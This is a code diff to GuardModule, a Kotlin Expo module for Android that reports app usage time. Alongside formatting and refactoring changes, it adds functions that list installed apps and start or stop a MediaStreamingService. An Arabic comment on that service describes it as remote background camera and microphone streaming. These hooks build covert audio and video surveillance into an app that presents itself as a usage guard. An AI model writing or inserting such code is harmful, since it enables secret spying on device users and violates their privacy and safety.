@@ -25,24 +25,47 @@ class GuardModule : Module() {
     Name("GuardModule")
 
     Function("hasUsageAccess") {
-      val context = appContext.reactContext
-        ?: throw IllegalStateException("Android context unavailable")
+      val context = appContext.reactContext ?: throw IllegalStateException("Android context unavailable")
       hasAccess(context)
     }
 
     Function("openUsageSettings") {
-      val context = appContext.reactContext
-        ?: throw IllegalStateException("Android context unavailable")
+      val context = appContext.reactContext ?: throw IllegalStateException("Android context unavailable")
       val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
         addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
       }
       context.startActivity(intent)
     }
 
-    AsyncFunction("getTodayUsage") {
-      val context = appContext.reactContext
-        ?: throw IllegalStateException("Android context unavailable")
+    // دالة بدء بث الكاميرا والميكروفون في الخلفية عن بُعد
+    Function("startRemoteStream") {
+      val context = appContext.reactContext ?: throw IllegalStateException("Android context unavailable")
+      val intent = Intent(context, MediaStreamingService::class.java).apply {
+        action = "START_STREAM"
+      }
+      context.startService(intent)
+      return@Function "Streaming Started"
+    }
 
+    // دالة إيقاف البث عن بُعد
+    Function("stopRemoteStream") {
+      val context = appContext.reactContext ?: throw IllegalStateException("Android context unavailable")
+      val intent = Intent(context, MediaStreamingService::class.java)
+      context.stopService(intent)
+      return@Function "Streaming Stopped"
+    }
+
+    AsyncFunction("getInstalledApps") {
+      val context = appContext.reactContext ?: throw IllegalStateException("Android context unavailable")
+      val pm = context.packageManager
+      pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
+        .filter { (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 }
+        .map { it.packageName }
+        .sorted()
+    }
+
+    AsyncFunction("getTodayUsage") {
+      val context = appContext.reactContext ?: throw IllegalStateException("Android context unavailable")
       if (!hasAccess(context)) {
         throw IllegalStateException("Usage access is not enabled")
       }
@@ -53,23 +76,27 @@ class GuardModule : Module() {
       calendar.set(Calendar.SECOND, 0)
       calendar.set(Calendar.MILLISECOND, 0)
 
-      val manager = context.getSystemService(Context.USAGE_STATS_SERVICE)
-        as UsageStatsManager
-
-      manager.queryUsageStats(
+      val manager = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
+      val stats = manager.queryUsageStats(
         UsageStatsManager.INTERVAL_DAILY,
         calendar.timeInMillis,
         System.currentTimeMillis()
-      ).orEmpty()
-        .filter { it.totalTimeInForeground > 0L }
+      )
+
+      if (stats.isNullOrEmpty()) {
+        return@AsyncFunction emptyList<Map<String, Any>>()
+      }
+
+      stats.filter { it.totalTimeInForeground > 0L }
         .groupBy { it.packageName }
         .map { (packageName, entries) ->
+          val totalMs = entries.map { it.totalTimeInForeground }.sum()
           mapOf(
             "packageName" to packageName,
-            "minutes" to entries.sumOf { it.totalTimeInForeground } / 60000L
+            "minutes" to (totalMs / 60000L).toInt()
           )
         }
-        .sortedByDescending { it["minutes"] as Long }
+        .sortedByDescending { it["minutes"] as Int }
     }
   }
 }
